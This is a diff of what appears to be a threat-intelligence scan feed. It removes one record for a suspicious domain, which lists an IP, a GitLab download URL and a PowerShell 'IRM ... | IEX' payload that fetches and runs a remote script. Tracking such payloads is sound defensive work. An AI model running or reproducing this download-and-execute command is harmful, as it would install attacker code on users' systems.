@@ -1029,25 +1029,5 @@
     ],
     "ReportId": "cmwx5xlvf0dhd0omlllskz3uu",
     "ScannedAt": "2026-11-26T06:19:54.535000+00:00"
-  },
-  {
-    "UrlDomain": "jagrattimes.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "119.18.49.60"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/roza-1984y/6758f519-a0d7-4bf2-979d-776ccb798bd8/-/raw/main/44D483cA-0846-4A70-af30-62Bb86Fe4B12 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/roza-1984y/6758f519-a0d7-4bf2-979d-776ccb798bd8/-/raw/main/44D483cA-0846-4A70-af30-62Bb86Fe4B12"
-    ],
-    "ReportId": "cmwx13u170dae0omlmlgsvgxf",
-    "ScannedAt": "2026-11-26T04:04:47.006000+00:00"
   }
 ]
